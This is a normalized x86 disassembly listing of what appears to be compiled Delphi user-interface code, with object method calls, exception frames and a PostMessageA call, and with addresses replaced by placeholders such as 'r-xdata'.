mov edx [ ebp - 0x34 ]
mov eax r-xdata
call sub_40c4e0
test eax eax
jne r-xdata
mov eax [ ebp - 0x14 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax [ ebp - 0x34 ]
mov al [ eax + ebx - 0x1 ]
mov edx [ rw-data ]
and eax 0xff
bt [ edx ] eax
jae r-xdata
dec esi
cmp esi 0xffffffff
jne r-xdata
mov edx [ rw-data ]
mov edx [ edx ]
mov eax [ ebp - 0x30 ]
call sub_40c4e0
test eax eax
je r-xdata
mov edx esi
mov eax [ ebp - 0x1c ]
call sub_419540
push eax
mov edx esi
mov eax [ ebp - 0x1c ]
call sub_479030
mov ecx [ eax + 0x20 ]
xor edx edx
mov eax [ ebp - 0x24 ]
mov ebx [ eax ]
call [ ebx + 0x64 ]
jmp r-xdata
lea ecx [ ebp - 0x34 ]
mov edx esi
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
cmp [ ebp - 0x18 ] 0x0
je r-xdata
dec [ ebp - 0x3c ]
jne r-xdata
inc edi
xor esi esi
lea eax [ ebp - 0x48 ]
push eax
mov ecx 0x1
mov edx ebx
mov eax [ ebp - 0x34 ]
call sub_4043d8
mov eax [ ebp - 0x48 ]
lea edx [ ebp - 0x30 ]
call sub_407d58
push ebp
mov eax [ ebp - 0x30 ]
call sub_47905c
pop ecx
test al al
je r-xdata
inc ebx
jmp r-xdata
push ebp
mov eax [ ebp - 0x30 ]
call sub_47905c
pop ecx
test al al
jne r-xdata
mov edx [ ebp - 0x34 ]
mov eax r-xdata
call sub_40c4e0
test eax eax
jne r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x38 ]
call sub_403f50
mov edx [ ebp - 0x24 ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax [ ebp - 0xc ]
mov edx [ eax ]
call [ edx + 0x44 ]
mov eax [ ebp - 0x14 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
cmp esi 0x0
jl r-xdata
mov edx esi
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edx eax
mov eax [ ebp - 0x24 ]
mov ecx [ eax ]
call [ ecx + 0x5c ]
mov [ ebp - 0x2c ] eax
mov eax [ ebp - 0x24 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ecx eax
dec ecx
mov edx [ ebp - 0x2c ]
mov eax [ ebp - 0x24 ]
mov ebx [ eax ]
call [ ebx + 0x70 ]
inc esi
dec edi
jne r-xdata
inc ebx
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
mov edx esi
mov eax [ ebp - 0x1c ]
call sub_479030
add eax 0x20
push eax
mov edx esi
mov eax [ ebp - 0x1c ]
call sub_479030
mov eax [ eax + 0x20 ]
lea edx [ ebp - 0x44 ]
call sub_45e254
mov edx [ ebp - 0x44 ]
pop eax
call sub_403f0c
mov edx esi
mov eax [ ebp - 0x1c ]
call sub_419540
push eax
mov edx esi
mov eax [ ebp - 0x1c ]
call sub_479030
mov ecx [ eax + 0x20 ]
xor edx edx
mov eax [ ebp - 0x24 ]
mov ebx [ eax ]
call [ ebx + 0x64 ]
lea eax [ ebp - 0x4c ]
push eax
mov eax [ ebp - 0x18 ]
call sub_404178
mov edx eax
mov ecx 0x1
mov eax [ ebp - 0x18 ]
call sub_4043d8
mov edx [ ebp - 0x4c ]
lea eax [ ebp - 0x34 ]
xor ecx ecx
call sub_479110
mov eax [ ebp - 0x18 ]
call sub_404178
mov edx eax
lea eax [ ebp - 0x18 ]
mov ecx 0x1
call sub_404418
lea edx [ ebp - 0x34 ]
mov ecx ebx
mov eax r-xdata
call sub_404460
lea eax [ ebp - 0x34 ]
mov ecx ebx
mov edx [ ebp - 0x30 ]
call sub_479110
jmp r-xdata
mov edx esi
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ecx eax
mov edx [ ebp - 0x34 ]
mov eax [ ebp - 0xc ]
mov ebx [ eax ]
call [ ebx + 0x3c ]
mov edx esi
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
jmp r-xdata
sub_479788
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_479bf4
call sub_419538
test eax eax
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_479bf4
mov edx [ eax + 0x20 ]
test edx edx
je r-xdata
cmp [ edx + 0xc ] 0x0
je r-xdata
mov eax [ edx + 0xc ]
mov si 0xffcf
call sub_403324
sub_4797c0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov esi edx
mov [ ebp - 0x4 ] eax
test esi esi
je r-xdata
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
mov eax esi
call sub_419538
dec eax
test eax eax
jl r-xdata
inc eax
mov [ ebp - 0x8 ] eax
xor ebx ebx
mov edx ebx
mov eax esi
call sub_479030
cmp [ eax + 0xc ] 0x0
je r-xdata
cmp [ ebp + 0xa ] 0x0
je r-xdata
cmp [ ebp + 0xa ] 0x0
je r-xdata
cmp [ ebp + 0xa ] 0x0
je r-xdata
mov edx ebx
mov eax esi
call sub_479030
mov edx [ eax ]
call [ edx + 0x30 ]
mov edx ebx
mov eax esi
call sub_479030
mov edx eax
mov eax [ ebp + 0xc ]
call [ ebp + 0x8 ]
jmp r-xdata
mov edx ebx
mov eax esi
call sub_479030
mov edx [ eax ]
call [ edx + 0x30 ]
mov edx ebx
mov eax esi
call sub_479030
mov edx eax
mov eax [ ebp + 0xc ]
call [ ebp + 0x8 ]
jmp r-xdata
mov edx ebx
mov eax esi
call sub_479030
mov edx [ eax ]
call [ edx + 0x30 ]
mov edx ebx
mov eax esi
call sub_479030
mov edx eax
mov eax [ ebp + 0xc ]
call [ ebp + 0x8 ]
jmp r-xdata
inc ebx
dec [ ebp - 0x8 ]
jne r-xdata
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov edx ebx
mov eax esi
call sub_479030
call sub_479bf4
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_4797c0
mov edx ebx
mov eax esi
call sub_479030
call sub_479788
jmp r-xdata
mov edx ebx
mov eax esi
call sub_479030
call sub_479bb4
test al al
je r-xdata
mov edx ebx
mov eax esi
call sub_479030
call sub_479788
mov edx ebx
mov eax esi
call sub_479030
call sub_479788
jmp r-xdata
sub_4798f4
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_41911c
xor eax eax
mov [ esi + 0x34 ] eax
mov [ esi + 0x14 ] 0x0
mov [ esi + 0x30 ] 0x1
mov [ esi + 0x28 ] 0x1
mov [ esi + 0x24 ] 0x20000000
mov [ esi + 0x14 ] 0x0
mov al [ r-xdata ]
mov [ esi + 0x31 ] al
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40348c
mov eax esi
pop esi
pop ebx
retn
call sub_4034e4
pop [ fs : 0x0 ]
add esp 0xc
sub_479954
push ebx
push esi
push edi
call sub_4034f4
mov ebx edx
mov edi eax
lea eax [ edi + 0x1c ]
call sub_40d31c
mov esi [ edi + 0xc ]
test esi esi
je r-xdata
mov eax edi
call sub_479af4
cmp [ edi + 0x10 ] 0x0
je r-xdata
test [ esi + 0x1c ] 0x8
jne r-xdata
mov eax edi
call sub_479b00
mov edx ebx
and dl 0xfc
mov eax edi
call sub_419154
test bl bl
jle r-xdata
lea eax [ edi + 0x10 ]
call sub_40d31c
mov eax esi
xor edx edx
mov ecx [ eax ]
call [ ecx + 0x124 ]
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_4034dc
sub_4799b8
push ebx
mov ebx eax
cmp [ ebx + 0x1c ] 0x0
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x1c ]
call sub_419538
test eax eax
jg r-xdata
mov al 0x1
pop ebx
retn
mov eax [ ebx + 0x1c ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
mov eax [ ebx + 0x1c ]
cmp [ eax + 0x28 ] 0x1
jne r-xdata
mov eax [ ebx + 0x1c ]
cmp [ eax + 0x24 ] 0x0
je r-xdata
mov eax [ ebx + 0x1c ]
cmp [ eax + 0x2a ] 0x0
je r-xdata
mov eax [ ebx + 0x1c ]
cmp [ eax + 0x29 ] 0x0
je r-xdata
sub_479a04
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax ebx
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_418d14
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x4 ]
test esi esi
je r-xdata
xor edx edx
push ebp
push sub_479adb
push [ fs : edx ]
mov [ fs : edx ] esp
mov esi ebx
mov edx [ esi + 0x24 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x28 ]
cmp [ esi + 0x1c ] 0x0
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x20 ]
mov eax esi
call sub_479c94
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_479b80
mov edx [ esi + 0x1c ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov dl [ esi + 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_479f80
mov dl [ esi + 0x30 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x2c ]
cmp [ esi + 0x2c ] 0x0
je r-xdata
mov eax esi
call sub_479b60
push eax
mov eax [ ebp - 0x4 ]
call sub_479b60
pop edx
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov edx [ esi + 0xc ]
mov eax [ ebp - 0x4 ]
call sub_479dfc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_479bf4
mov edx [ esi + 0x2c ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
retn
mov edx [ eax ]
call [ edx + 0x24 ]
sub_479b00
push ebx
push esi
push edi
mov ebx eax
mov esi [ ebx + 0x2c ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_419538
test eax eax
jle r-xdata
mov eax [ ebx + 0x2c ]
call sub_403128
xor eax eax
mov [ ebx + 0x2c ] eax
mov eax [ ebx + 0x2c ]
call sub_419538
mov edi eax
dec edi
test edi edi
jl r-xdata
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov edx esi
mov eax [ ebx + 0x2c ]
call sub_47a4d4
call sub_479b00
mov edx esi
mov eax [ ebx + 0x2c ]
call sub_47a4d4
cmp [ eax + 0x2c ] 0x0
je r-xdata
sub_479b80
push ebx
mov ebx eax
cmp [ ebx + 0x1c ] 0x0
jne r-xdata
mov eax [ ebx + 0x1c ]
pop ebx
retn
mov eax [ r-xdata ]
push eax
mov eax ebx
call sub_479c90
call sub_479044
mov ecx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_47a3a0
mov [ ebx + 0x1c ] eax
sub_479bb4
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x2c ]
test esi esi
je r-xdata
xor eax eax
pop esi
pop ebx
retn
mov eax esi
call sub_419538
test eax eax
jg r-xdata
mov al 0x1
pop esi
pop ebx
retn
sub_479bd4
push ebx
mov ebx eax
mov eax ebx
call sub_47b09c
test eax eax
je r-xdata
xor eax eax
pop ebx
retn
mov eax ebx
call sub_47b09c
mov eax [ eax + 0x20 ]
pop ebx
retn
sub_479bf4
push ebx
push esi
push edi
mov ebx eax
cmp [ ebx + 0x2c ] 0x0
jne r-xdata
mov eax [ ebx + 0x2c ]
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_479c90
test eax eax
je r-xdata
mov eax [ r-xdata ]
push eax
mov eax ebx
call sub_479c90
call sub_479044
mov ecx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_47a3a0
mov [ ebx + 0x2c ] eax
mov eax ebx
call sub_479c90
call sub_479044
test eax eax
je r-xdata
mov eax ebx
call sub_479c90
call sub_479044
mov edi eax
mov eax edi
mov si 0xffec
call sub_403324
push eax
mov eax edi
mov si 0xffed
call sub_403324
push eax
mov eax ebx
call sub_479c90
call sub_479044
mov ecx eax
mov dl 0x1
pop eax
call sub_47a3a0
mov [ ebx + 0x2c ] eax
jmp r-xdata
mov eax [ ebx + 0x2c ]
mov [ eax + 0x20 ] ebx
sub_479c94
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x10 ]
test esi esi
je r-xdata
xor eax eax
pop esi
pop ebx
retn
cmp [ esi + 0xc ] 0x0
je r-xdata
mov eax [ esi + 0xc ]
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
sub_479cbc
push ebx
push esi
push edi
push ebp
mov esi eax
xor ebx ebx
mov eax esi
call sub_479bf4
call sub_419538
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax ebx
pop ebp
pop edi
pop esi
pop ebx
retn
inc edi
xor ebp ebp
mov eax esi
call sub_479bf4
mov edx ebp
call sub_47a4d4
call sub_479cbc
test al al
je r-xdata
mov eax esi
call sub_479bf4
mov edx ebp
call sub_47a4d4
cmp [ eax + 0x30 ] 0x0
je r-xdata
inc ebp
dec edi
jne r-xdata
mov bl 0x1
mov bl 0x1
jmp r-xdata
mov eax esi
call sub_479bf4
mov edx ebp
call sub_47a4d4
call sub_47b8c0
test al al
jne r-xdata
sub_479d30
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x10 ]
test esi esi
je r-xdata
xor eax eax
pop esi
pop ebx
retn
cmp [ esi + 0xc ] 0x0
je r-xdata
mov eax [ esi + 0xc ]
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
sub_479d58
push ebx
push esi
push edi
mov esi edx
mov edi eax
xor ebx ebx
test esi esi
je r-xdata
mov bl 0x1
jmp r-xdata
test esi esi
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_479c90
mov edi [ eax + 0x20 ]
test edi edi
je r-xdata
mov eax esi
call sub_479bf4
cmp eax [ edi + 0x4 ]
jne r-xdata
mov eax esi
call sub_479bf4
cmp eax [ edi + 0x4 ]
jne r-xdata
mov eax edi
call sub_479c90
mov edi [ eax + 0x20 ]
test edi edi
jne r-xdata
mov bl 0x1
jmp r-xdata
sub_479dac
push ebx
mov ebx eax
cmp [ ebx + 0x2c ] 0x0
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x2c ]
call sub_419538
test eax eax
jg r-xdata
mov al 0x1
pop ebx
retn
mov eax [ ebx + 0x2c ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
mov eax [ ebx + 0x2c ]
cmp [ eax + 0x28 ] 0x1
jne r-xdata
mov eax [ ebx + 0x2c ]
cmp [ eax + 0x24 ] 0x0
je r-xdata
mov eax [ ebx + 0x2c ]
cmp [ eax + 0x2a ] 0x0
je r-xdata
mov eax [ ebx + 0x2c ]
cmp [ eax + 0x29 ] 0x0
je r-xdata
sub_479dfc
push ebp
mov ebp esp
add esp 0xfffffff8
push esi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_479edf
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ esi + 0xc ]
cmp eax [ ebp - 0x4 ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_479ee6
lea eax [ ebp - 0x8 ]
call sub_403eb8
retn
mov eax esi
call sub_479c90
test eax eax
je r-xdata
mov eax [ esi + 0xc ]
test eax eax
je r-xdata
mov edx [ eax + 0x20 ]
test edx edx
je r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
cmp [ eax + 0x210 ] 0x0
je r-xdata
xor eax eax
cmp [ edx + 0xc ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ esi + 0xc ] eax
mov eax esi
call sub_479c90
call sub_479044
test [ eax + 0x1c ] 0x1
jne r-xdata
mov edx [ eax ]
call [ edx + 0xd0 ]
mov eax edx
call sub_479c90
jmp r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405c78
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b7fc
call sub_4038f4
jmp r-xdata
mov eax esi
call sub_479c90
call sub_479044
cmp [ eax + 0x90 ] 0x0
jne r-xdata
test eax eax
jne r-xdata
mov edx esi
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x124 ]
sub_479f04
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_479bb4
test al al
je r-xdata
mov esi [ ebx + 0xc ]
test esi esi
je r-xdata
mov eax esi
call sub_47d41c
call sub_419538
dec eax
test eax eax
jl r-xdata
mov eax [ ebx + 0xc ]
call sub_44c098
mov eax [ ebx + 0xc ]
mov edx [ eax ]
call [ edx + 0x7c ]
inc eax
mov esi eax
xor edi edi
mov eax [ ebx + 0xc ]
call sub_47d41c
mov edx edi
call sub_47a4d4
mov eax [ eax + 0x40 ]
mov dl [ ebx + 0x14 ]
add dl 0xfd
sub dl 0x2
setb dl
xor dl 0x1
call sub_47fcfc
inc edi
dec esi
jne r-xdata
sub_479f80
push ebx
push esi
push edi
push ebp
mov ebx edx
mov ebp eax
cmp bl [ ebp + 0x14 ]
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov [ ebp + 0x14 ] bl
mov eax ebp
call sub_479c94
test al al
je r-xdata
mov eax [ ebp + 0xc ]
test eax eax
je r-xdata
mov eax ebp
call sub_479bb4
test al al
je r-xdata
mov si 0xffd0
call sub_403324
mov eax [ ebp + 0xc ]
mov edx [ eax ]
call [ edx + 0x7c ]
mov eax ebp
call sub_479bf4
call sub_419538
mov edi eax
dec edi
test edi edi
jl r-xdata
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov eax ebp
call sub_479bf4
mov edx esi
call sub_47a4d4
mov eax [ eax + 0x40 ]
mov edx ebx
add dl 0xfd
sub dl 0x2
setb dl
xor dl 0x1
call sub_47fcfc
mov eax ebp
call sub_479bf4
mov edx esi
call sub_47a4d4
cmp [ eax + 0x40 ] 0x0
je r-xdata
sub_47a05c
mov edx [ eax + 0xc ]
test edx edx
je r-xdata
retn
mov ecx [ eax + 0x24 ]
cmp ecx 0x20000000
jne r-xdata
mov eax ecx
xchg edx eax
call sub_44914c
mov eax edx
mov dl 0x1
call sub_449170
jmp r-xdata
sub_47a084
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4798f4
mov [ esi + 0x38 ] 0x1
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40348c
mov eax esi
pop esi
pop ebx
retn
call sub_4034e4
pop [ fs : 0x0 ]
add esp 0xc
sub_47a0c0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edi [ ebx + 0xc ]
test edi edi
je r-xdata
mov edx esi
mov eax ebx
call sub_4191c0
mov ecx [ edi + 0x8 ]
mov eax esi
mov edx r-xdata
call sub_4041c4
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_47a13c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp bl [ eax + 0x39 ]
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov [ eax + 0x39 ] bl
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_479bf4
call sub_419538
mov esi eax
dec esi
test esi esi
jl r-xdata
call sub_44c070
xor eax eax
push ebp
push sub_47a1ef
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_479bf4
call sub_419538
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc ]
call sub_44c078
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc ]
mov si 0xffcf
call sub_403324
retn
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_479bf4
mov edx edi
call sub_47a4d4
mov eax [ eax + 0x40 ]
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0xd4 ]
inc edi
dec esi
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_479bf4
mov edx edi
call sub_47a4d4
mov eax [ eax + 0x40 ]
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0xd4 ]
mov eax [ ebp - 0x4 ]
call sub_479bf4
mov edx edi
call sub_47a4d4
cmp [ eax + 0x40 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_479bf4
mov edx edi
call sub_47a4d4
cmp [ eax + 0x40 ] 0x0
je r-xdata
sub_47a264
push ebp
mov ebp esp
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov eax [ ebp + 0x8 ]
push eax
xor edx edx
mov eax esi
call sub_419880
xor eax eax
mov [ esi + 0x28 ] eax
mov dl 0x1
mov eax esi
call sub_47a370
mov dl 0x1
mov eax esi
call sub_47a388
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40348c
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_4034e4
pop [ fs : 0x0 ]
add esp 0xc
sub_47a2c8
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0xc ] 0x0
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4032d8
mov eax [ eax + 0xc ]
mov dl [ esi + 0x2c ]
call sub_4490fc
sub_47a32c
push ebx
push esi
mov ebx ecx
mov esi edx
mov ecx ebx
mov edx esi
call sub_41985c
cmp bl 0x2
jne r-xdata
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_4032d8
mov edx [ eax + 0xc ]
test edx edx
je r-xdata
xor eax eax
mov [ edx + 0x210 ] eax
sub_47a3a0
push ebp
mov ebp esp
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov eax [ ebp + 0x8 ]
push eax
xor edx edx
mov eax esi
call sub_419880
mov [ esi + 0x28 ] 0x1
mov [ esi + 0x29 ] 0x1
mov [ esi + 0x2a ] 0x1
mov [ esi + 0x1c ] 0x1
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40348c
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_4034e4
pop [ fs : 0x0 ]
add esp 0xc
sub_47a3fc
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_4193b8
mov eax esi
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edi esi
mov dl [ edi + 0x1c ]
mov eax ebx
call sub_4798e4
mov al [ edi + 0x24 ]
mov [ ebx + 0x24 ] al
mov dl [ edi + 0x2a ]
mov eax ebx
call sub_47a700
mov dl [ edi + 0x28 ]
mov eax ebx
call sub_47a674
mov dl [ edi + 0x29 ]
mov eax ebx
call sub_47a72c
sub_47a454
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov edx [ r-xdata ]
call sub_4032d8
mov ebx eax
mov [ ebx + 0x3c ] 0x1
cmp [ ebx + 0x2c ] 0x0
je r-xdata
mov eax ebx
call sub_479bf4
mov dl [ esi + 0x2a ]
call sub_47a700
sub_47a498
push ebx
push esi
push edi
mov ebx edx
mov eax ebx
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov edx [ r-xdata ]
call sub_4032d8
mov esi eax
mov edi [ esi + 0x40 ]
test edi edi
je r-xdata
mov eax edi
mov edx [ eax ]
call [ edx + 0xdc ]
sub_47a4e8
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_41985c
sub bl 0x1
jb r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_4032d8
mov ebx [ edi + 0x20 ]
test ebx ebx
je r-xdata
je r-xdata
pop edi
pop esi
pop ebx
retn
test ebx ebx
je r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
dec bl
je r-xdata
xor ebx ebx
mov edx [ edi + 0x20 ]
mov eax [ edx + 0xc ]
test eax eax
je r-xdata
mov eax ebx
call sub_479c90
mov dl 0x1
call sub_479270
mov eax esi
mov edx [ r-xdata ]
call sub_4032d8
mov ebx eax
mov eax ebx
call sub_479bd4
test eax eax
je r-xdata
mov eax esi
call sub_479b00
mov eax esi
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
jmp r-xdata
mov eax [ edx + 0x18 ]
test eax eax
je r-xdata
mov ebx eax
jmp r-xdata
mov eax ebx
call sub_479bd4
cmp [ eax + 0x18 ] 0x0
je r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_4032d8
mov ebx eax
mov eax ebx
call sub_479bd4
test eax eax
je r-xdata
cmp [ edi + 0xc ] 0x0
jne r-xdata
mov ebx eax
mov eax ebx
call sub_479bd4
mov eax [ eax + 0x18 ]
call sub_44fadc
test al al
je r-xdata
mov eax ebx
call sub_479bd4
cmp [ eax + 0x18 ] 0x0
je r-xdata
test ebx ebx
je r-xdata
push 0x0
push 0x0
push 0x5
mov eax ebx
call sub_479bd4
mov eax [ eax + 0x18 ]
call sub_44f7d8
push eax
call PostMessageA
jmp r-xdata
mov eax ebx
call sub_479bd4
mov eax [ eax + 0x18 ]
call sub_44fadc
test al al
je r-xdata
mov eax ebx
call sub_44fadc
test al al
je r-xdata
push 0x0
push 0x0
push 0x5
mov eax ebx
call sub_479bd4
mov eax [ eax + 0x18 ]
call sub_44f7d8
push eax
call PostMessageA
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xd4 ]
jmp r-xdata
sub_47a674
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp dl [ eax + 0x28 ]
je r-xdata
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov [ eax + 0x28 ] dl
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
push eax
push sub_47a498
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
call sub_4797c0
cmp [ eax + 0xc ] 0x0
je r-xdata
mov eax [ eax + 0xc ]
call sub_44c070
xor eax eax
push ebp
push sub_47a6df
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
push eax
push sub_47a498
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
call sub_4797c0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20 ]
mov eax [ eax + 0xc ]
call sub_44c078
retn
sub_47a700
push ebx
mov ebx eax
cmp dl [ ebx + 0x2a ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x2a ] dl
mov eax ebx
call sub_479044
test [ eax + 0x1c ] 0x1
jne r-xdata
push ebx
push sub_47a454
mov edx ebx
mov eax ebx
call sub_4797c0
sub_47a72c
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp bl [ eax + 0x29 ]
je r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov [ eax + 0x29 ] bl
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20 ]
test eax eax
je r-xdata
mov ecx ebx
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
call sub_47a7c0
cmp [ eax + 0xc ] 0x0
je r-xdata
mov eax [ eax + 0xc ]
call sub_44c070
xor eax eax
push ebp
push sub_47a7a6
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx ebx
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
call sub_47a7c0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20 ]
mov eax [ eax + 0xc ]
mov si 0xffd0
call sub_403324
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20 ]
mov eax [ eax + 0xc ]
call sub_44c078
retn
sub_47a7c0
push ebx
push esi
push edi
push ebp
push ecx
mov ebx ecx
mov esi edx
